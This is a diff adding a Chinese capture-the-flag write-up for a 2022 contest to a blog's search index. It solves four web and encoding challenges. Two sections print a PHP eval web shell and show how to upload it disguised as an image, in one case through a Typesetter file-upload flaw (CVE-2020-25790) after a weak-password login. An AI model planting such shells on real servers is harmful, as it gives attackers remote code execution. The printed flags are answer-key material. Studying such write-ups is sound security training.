@@ -4,6 +4,27 @@
   
     
     <entry>
+      <title>2022年蓝贝国际创新创业大赛数字技术+信息安全领域赛道网络攻防大赛wp</title>
+      <link href="/2022/07/15/2022%E5%B9%B4%E8%93%9D%E8%B4%9D%E5%9B%BD%E9%99%85%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E6%8A%80%E6%9C%AF-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E8%B5%9B%E9%81%93%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9Bwp/"/>
+      <url>/2022/07/15/2022%E5%B9%B4%E8%93%9D%E8%B4%9D%E5%9B%BD%E9%99%85%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E6%8A%80%E6%9C%AF-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E8%B5%9B%E9%81%93%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9Bwp/</url>
+      
+        <content type="html"><![CDATA[<h1 id="2022年蓝贝国际创新创业大赛“数字技术-信息安全领域赛道网络攻防大赛”wp"><a href="#2022年蓝贝国际创新创业大赛“数字技术-信息安全领域赛道网络攻防大赛”wp" class="headerlink" title="2022年蓝贝国际创新创业大赛“数字技术+信息安全领域赛道网络攻防大赛”wp"></a>2022年蓝贝国际创新创业大赛“数字技术+信息安全领域赛道网络攻防大赛”wp</h1><h2 id="mine"><a href="#mine" class="headerlink" title="mine"></a>mine</h2><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353647.png" alt="img"></p><p>注意观察这个符号，对应的是src.js中的res&#x2F;face_normal.bmp</p><p>进行查找别的face，发现有face_success.bmp</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353993.png" alt="img"></p><p>首先进行hex解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353310.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LJWXQ2C2GN2FKYKXGVXGGMTIGFGUQTJQMIZHQ3CJK42GQYKHKZ2VIQ2GN5MVGRTKJVKEEMSZLBFDS===</span><br></pre></td></tr></table></figure><p>然后进行base32解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353317.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tUaW5nc2h1MHM0b2xlIW4haGVuTCFoYSFjMTB2YXJ9</span><br></pre></td></tr></table></figure><p>然后进行base64解码</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353893.png" alt="img"></p><p>flag{Tingshu0s4ole!n!henL!ha!c10var}</p><h2 id="cook"><a href="#cook" class="headerlink" title="cook"></a>cook</h2><p>查看cookie</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353837.png" alt="img"></p><p>然后访问7815696ecbf1c96e6894b779456d330e.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353401.png" alt="img"></p><p>flag{c7a4c2050907de3b70c519287f171f35}</p><h2 id="upload-inc"><a href="#upload-inc" class="headerlink" title="upload-inc"></a>upload-inc</h2><p>查看源码，提示include.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353475.png" alt="img"></p><p>然后访问include.php，查看源码：提示upload.php和参数为file</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353880.png" alt="img"></p><p>似乎是原题<a href="http://danyhug.gitee.io/blog/2021/01/05/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8-%E7%AD%BE%E5%88%B0%E8%88%AC%E7%9A%84%E5%8C%85%E5%90%AB/">第十一周 | 签到般的包含 | Danyhug’s Blog (gitee.io)</a></p><p>整一个1.php，写一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进行压缩，将压缩文件后缀改为png</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353108.png" alt="img"></p><p>进行文件上传</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353621.png" alt="img"></p><p>然后蚁剑连接</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353921.png" alt="image-20220715172645597"></p><h2 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h2><p>找到登录界面</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353471.png" alt="img"></p><p>按照这个做一遍，弱密码登录</p><p><a href="https://blog.csdn.net/qq_48985780/article/details/122236773">typesetter 文件上传（CVE-2020-25790）_xzhome的博客-CSDN博客</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353215.png" alt="image-20220715201703774"></p><p>然后上传木马1.zip，加压，然后蚁剑直接连接</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353087.png" alt="img"></p><p>找到flag.txt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152354803.png" alt="img"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+            <tag> 2022 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ciscn2022-web-会聊天的机器人</title>
       <link href="/2022/07/14/ciscn2022-web-%E4%BC%9A%E8%81%8A%E5%A4%A9%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
       <url>/2022/07/14/ciscn2022-web-%E4%BC%9A%E8%81%8A%E5%A4%A9%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
